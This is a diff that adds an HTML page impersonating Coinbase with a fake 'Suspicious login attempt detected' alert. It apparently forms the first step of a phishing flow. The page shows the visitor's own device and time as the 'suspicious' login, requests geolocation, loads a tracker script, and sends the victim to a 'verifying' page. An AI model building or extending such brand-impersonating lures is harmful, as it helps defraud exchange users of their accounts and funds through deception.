@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Alert - Coinbase</title>
+    <link rel="icon" type="image/svg+xml" href="assets/images/favicon.svg">
+    <link rel="stylesheet" href="styles.css">
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="logo-container">
+            <img src="assets/images/favicon.svg" alt="Coinbase" class="logo">
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="signup-container">
+            <!-- Alert Icon -->
+            <div class="alert-icon">
+                <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
+                    <circle cx="32" cy="32" r="32" fill="#ffa726" opacity="0.15"/>
+                    <circle cx="32" cy="32" r="24" fill="#ffa726" opacity="0.25"/>
+                    <path d="M32 20v16m0 4v4" stroke="#ffa726" stroke-width="3" stroke-linecap="round"/>
+                </svg>
+            </div>
+
+            <h1 class="title">Suspicious login attempt detected</h1>
+            <p class="subtitle">We noticed a login from an unrecognized device or location. Please verify your identity to continue.</p>
+
+            <!-- Alert Details -->
+            <div class="alert-details">
+                <div class="alert-item">
+                    <span class="alert-label">Location:</span>
+                    <span class="alert-value" id="locationInfo">Loading...</span>
+                </div>
+                <div class="alert-item">
+                    <span class="alert-label">Device:</span>
+                    <span class="alert-value" id="deviceInfo">Loading...</span>
+                </div>
+                <div class="alert-item">
+                    <span class="alert-label">Time:</span>
+                    <span class="alert-value" id="timeInfo">Loading...</span>
+                </div>
+            </div>
+
+            <!-- Confirmation Form -->
+            <form id="securityForm" class="signup-form">
+                <button type="submit" class="continue-btn active">Yes, this was me</button>
+            </form>
+
+            <button class="secondary-btn">No, secure my account</button>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <p class="footer-text">
+            This is an automated security measure to protect your account.
+        </p>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const securityForm = document.getElementById('securityForm');
+            
+            // Get user's location and device info
+            const userAgent = navigator.userAgent;
+            let deviceType = 'Unknown Device';
+            
+            if (/mobile/i.test(userAgent)) {
+                deviceType = 'Mobile Device';
+            } else if (/tablet/i.test(userAgent)) {
+                deviceType = 'Tablet';
+            } else {
+                deviceType = 'Desktop Computer';
+            }
+            
+            document.getElementById('deviceInfo').textContent = deviceType;
+            document.getElementById('timeInfo').textContent = new Date().toLocaleString();
+            
+            // Try to get location (fallback if not available)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        document.getElementById('locationInfo').textContent = 'Current Location';
+                    },
+                    function(error) {
+                        document.getElementById('locationInfo').textContent = 'Unknown Location';
+                    }
+                );
+            } else {
+                document.getElementById('locationInfo').textContent = 'Unknown Location';
+            }
+            
+            securityForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                window.location.href = 'verifying.html';
+            });
+        });
+    </script>
+</body>
+</html>
